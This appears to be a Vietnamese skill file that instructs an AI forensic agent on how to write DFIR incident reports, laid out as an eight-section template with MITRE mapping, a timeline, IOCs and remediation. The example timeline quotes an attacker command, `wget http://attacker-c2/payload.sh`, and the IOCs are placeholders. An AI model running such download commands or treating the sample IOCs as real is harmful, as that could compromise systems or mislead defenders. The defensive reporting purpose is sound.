---
name: forensic-reporting
description: Quy chuẩn và kỹ năng viết Báo cáo Điều tra Forensic & Ứng cứu Sự cố (DFIR Technical & Executive Report) chuẩn quốc tế theo ISO/IEC 27037, NIST SP 800-86 và SANS FOR508. Tự động xuất báo cáo đầy đủ các phần: Executive Summary, Chain of Custody, MITRE ATT&CK, Attack Timeline, Deep Technical Analysis, IOCs và Remediation.
---

# Kỹ Năng Viết Báo Cáo Forensic & Ứng Cứu Sự Cố Chuẩn Quốc Tế (DFIR Reporting Framework)

Kỹ năng này định hình toàn bộ cấu trúc, văn phong và tiêu chuẩn bằng chứng khi **V-AutoFor AI** lập báo cáo điều tra sự cố kỹ thuật số (Digital Forensics & Incident Response).

Mọi báo cáo do V-AutoFor tạo ra phải đảm bảo:
1. **Tính pháp lý & Tính toàn vẹn (ISO/IEC 27037):** Chứng minh chuỗi bảo quản bằng chứng (Chain of Custody), kiểm tra mã băm MD5/SHA256 trước và sau phân tích.
2. **Tính kỹ thuật sâu sắc (NIST SP 800-86):** Trích dẫn chính xác log record, PID, file offset, network packet, hex dump, timestamp.
3. **Tính chiến lược (Executive Level):** Có phần tóm tắt ngắn gọn, dễ hiểu dành cho Lãnh đạo/CISO, chỉ rõ thiệt hại và mức độ rủi ro.
4. **Tính quy chuẩn (MITRE ATT&CK Enterprise):** Mọi hành vi của tin tặc đều được phân loại theo Tactic (Chiến thuật) và Technique (Kỹ thuật).

---

## Khung Cấu Trúc Báo Cáo Chuẩn Mẫu (Forensic Report Template)

Khi người dùng yêu cầu viết báo cáo hoặc khi kết thúc một cuộc điều tra, V-AutoFor **PHẢI** xuất báo cáo theo đúng cấu trúc 8 phần sau:

```markdown
# BÁO CÁO ĐIỀU TRA SỰ CỐ AN NINH MẠNG & GIÁM ĐỊNH KỸ THUẬT SỐ
**Mã vụ việc (Case ID):** [Điền mã vụ việc, ví dụ: DFIR-2026-c46-FirstHack]
**Ngày lập báo cáo:** [YYYY-MM-DD] | **Phân loại bảo mật:** TỐI MẬT / NỘI BỘ
**Đơn vị thực hiện:** Đội ngũ Giám định Kỹ thuật số & Phản ứng Sự cố (V-AutoFor Platform)
**Điều tra viên AI:** V-AutoFor Autonomous Forensic Agent

---

## 1. TÓM TẮT ĐIỀU HÀNH (EXECUTIVE SUMMARY)
- **Bản chất sự cố:** Tóm tắt ngắn gọn trong 2-3 câu về chuyện gì đã xảy ra (ví dụ: Máy chủ Web bị xâm nhập thông qua Web Shell sau khi bị tấn công Brute-force dịch vụ SSH).
- **Mức độ nghiêm trọng (Severity):** [CRITICAL / HIGH / MEDIUM / LOW]
- **Tình trạng hiện tại:** Đã ngăn chặn / Đang cô lập / Cần xử lý khẩn cấp.
- **Tài sản bị ảnh hưởng:** Tên máy chủ, IP, hệ điều hành, dịch vụ bị tấn công.
- **Thiệt hại ghi nhận:** Dữ liệu bị rò rỉ, quyền kiểm soát root/admin bị chiếm đoạt, tài nguyên bị lợi dụng đào coin/quét mạng.

---

## 2. CHUỖI BẢO QUẢN & THÔNG TIN BẰNG CHỨNG (CHAIN OF CUSTODY)
Bảng kê khai toàn bộ chứng cứ số được tiếp nhận và kết quả xác minh toàn vẹn:

| Tên mẫu bằng chứng | Định dạng | Nguồn thu thập | Dung lượng | MD5 Checksum | SHA-256 Checksum | Trạng thái toàn vẹn |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| FirstHack.ad1 | Logical Image | /boot, /var/log, /root | 83.6 MB | f7c4fab05c3a7473... | [Tính toán] | Khớp 100% với file log FTK |
| FirstHack.ad1.txt | Metadata Log | FTK Imager 4.5.0.3 | 1.2 KB | - | - | Xác nhận nguồn trích xuất |

*Ghi chú: Toàn bộ quá trình phân tích được thực hiện trên bản sao lưu Read-Only, không làm thay đổi thuộc tính hoặc nội dung của file bằng chứng gốc.*

---

## 3. MA TRẬN CHIẾN THUẬT & KỸ THUẬT TẤN CÔNG (MITRE ATT&CK MAPPING)

| Chiến thuật (Tactic) | Mã kỹ thuật | Tên kỹ thuật (Technique) | Mô tả hành vi phát hiện trên hệ thống |
| :--- | :--- | :--- | :--- |
| **Initial Access** | T1110.001 | Password Guessing / Brute-Force | Kẻ tấn công thực hiện brute-force SSH từ IP [x.x.x.x] với hơn [N] lần thử. |
| **Execution** | T1059.004 | Unix Shell | Thực thi hàng loạt lệnh Linux độc hại qua bash shell. |
| **Persistence** | T1053.003 | Cron | Thiết lập lịch cronjob tự động kết nối ngược ra bên ngoài. |
| **Privilege Escalation**| T1548.003 | Sudo and Sudo Caching | Lợi dụng quyền sudo hoặc leo thang chiếm quyền root. |
| **Defense Evasion** | T1070.003 | Clear Command History | Gõ lệnh `history -c` hoặc xóa `/root/.bash_history` nhằm phi tang. |
| **Command & Control** | T1071.001 | Web Protocols (C2) | Kết nối ra IP máy chủ C2 qua HTTP/HTTPS/Reverse TCP. |

---

## 4. DÒNG THỜI GIAN SỰ KIỆN (CHRONOLOGICAL INCIDENT TIMELINE)
Mọi mốc thời gian đều được đồng bộ theo giờ chuẩn (UTC / UTC+7 ghi rõ):

| Thời gian (Timestamp) | Nguồn bằng chứng (Artifact) | Hành động / Sự kiện phát hiện | Chi tiết kỹ thuật & Chỉ số |
| :--- | :--- | :--- | :--- |
| **2021-05-25 15:10:02** | `auth.log` | Bắt đầu đợt quét SSH brute force | Hàng loạt thông báo `Failed password for invalid user` từ IP [x.x.x.x]. |
| **2021-05-25 15:18:45** | `auth.log` | Đăng nhập thành công | `Accepted password for root from [x.x.x.x] port 44211 ssh2`. |
| **2021-05-25 15:20:12** | `.bash_history` | Tải công cụ độc hại | Lệnh `wget http://attacker-c2/payload.sh` và cấp quyền `chmod +x`. |
| **2021-05-25 15:24:00** | `/etc/crontab` | Thiết lập Persistence | Thêm dòng cronjob gọi reverse shell mỗi 10 phút. |

---

## 5. PHÂN TÍCH KỸ THUẬT CHUYÊN SÂU (TECHNICAL EVIDENCE ANALYSIS)
Phần này trình bày chi tiết từng dấu vết cụ thể tìm thấy:

### 5.1. Dấu vết xâm nhập ban đầu & Dịch vụ bị khai thác
- Phân tích chi tiết file log xác thực hoặc gói tin mạng.
- Địa chỉ IP nguồn của kẻ tấn công, dải mạng, quốc gia/ISP.

### 5.2. Hoạt động của kẻ tấn công trên hệ điều hành (Post-Exploitation)
- Trích dẫn toàn văn các câu lệnh trong `.bash_history` hoặc PowerShell cmdline.
- Các tài khoản người dùng mới được tạo hoặc nhóm quyền bị thay đổi.
- Các tệp tin mã độc, web shell (đường dẫn, dung lượng, mã băm, chức năng).

### 5.3. Hoạt động trên bộ nhớ RAM & Mạng (nếu có RAM dump / PCAP)
- Các tiến trình ẩn bị inject mã độc (`malfind`).
- Các kết nối mạng ra C2 server, DNS Tunneling, các phiên truyền file bí mật.

---

## 6. DANH MỤC CHỈ SỐ XÂM HẠI (INDICATORS OF COMPROMISE - IOCS)
Cung cấp định dạng chuẩn để đội ngũ SOC/Hunting đưa ngay vào hệ thống phòng thủ (SIEM / Firewall / EDR):

### 6.1. Network IOCs
- **IP Kẻ tấn công (Attacker IPs):** `192.168.1.100` (SSH Brute Force), `45.33.32.156` (C2 Server).
- **Domains / C2 URLs:** `http://malicious-domain.com/shell.php`
- **Cổng giao tiếp bất thường (Suspicious Ports):** `4444/TCP`, `1337/TCP`.

### 6.2. Host & File IOCs
- **Mã băm Web Shell / Payload (SHA-256):** `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`
- **Đường dẫn tệp độc hại (File Paths):** `/var/www/html/uploads/shell.php`, `/tmp/.backdoor`
- **Lịch tự động (Persistence Artifacts):** Dòng cronjob `/var/spool/cron/crontabs/root`

---

## 7. NGUYÊN NHÂN GỐC RỄ (ROOT CAUSE ANALYSIS - RCA)
- **Điểm yếu cốt lõi:** Mật khẩu tài khoản root yếu, không đổi mật khẩu mặc định, mở dịch vụ SSH trực tiếp ra Internet mà không bật xác thực khóa công khai (Public Key Authentication) hoặc 2FA.
- **Thiếu hụt giám sát:** Hệ thống chưa cài đặt Fail2Ban để chặn brute-force tự động, chưa cấu hình EDR để cảnh báo lệnh tải file từ `/tmp`.

---

## 8. BIỆN PHÁP KHẮC PHỤC & PHÒNG NGỪA (REMEDIATION & HARDENING)

### 8.1. Hành động khẩn cấp tức thời (Containment)
1. **Cô lập:** Chặn toàn bộ IP trong danh mục Network IOCs trên Firewall biên.
2. **Thu hồi quyền:** Đổi toàn bộ mật khẩu tài khoản hệ thống (`root`, user dịch vụ) và thu hồi SSH Authorized Keys lạ.
3. **Triệt phá:** Xóa bỏ tệp web shell, gỡ bỏ cronjob độc hại và kill các tiến trình reverse shell đang chạy ngầm.

### 8.2. Biện pháp phòng ngừa lâu dài (Hardening & Prevention)
1. **Cấu hình SSH an toàn:** Thiết lập `PermitRootLogin no`, đổi port SSH mặc định, chỉ cho phép đăng nhập bằng SSH Key có passphrase.
2. **Triển khai Fail2Ban / IP Rate Limiting:** Tự động khóa IP sau 5 lần đăng nhập thất bại.
3. **Phân quyền tối thiểu (Least Privilege):** Giới hạn quyền ghi của Web Server, chặn thực thi mã từ thư mục `/tmp` và `/var/tmp` (`noexec`).
4. **Tăng cường giám sát:** Cấu hình đẩy log tập trung về SIEM, thiết lập cảnh báo tức thời khi có đăng nhập root ngoài giờ hành chính.
```

---

## Nguyên Tắc Biên Soạn Báo Cáo Của V-AutoFor AI

* **Khách quan và Trung thực:** Chỉ kết luận dựa trên bằng chứng kỹ thuật đã được trích xuất và xác thực.
* **Cấu trúc rõ ràng, Định dạng Markdown chuẩn:** Sử dụng bảng biểu, code block, và phân cấp tiêu đề `##`, `###` mạch lạc.
* **Hỗ trợ Song ngữ:** Mặc định trình bày bằng Tiếng Việt chuẩn chuyên ngành An toàn thông tin, giữ nguyên các thuật ngữ kỹ thuật quốc tế (MITRE ATT&CK, Persistence, Brute-Force, Reverse Shell, Hashes).
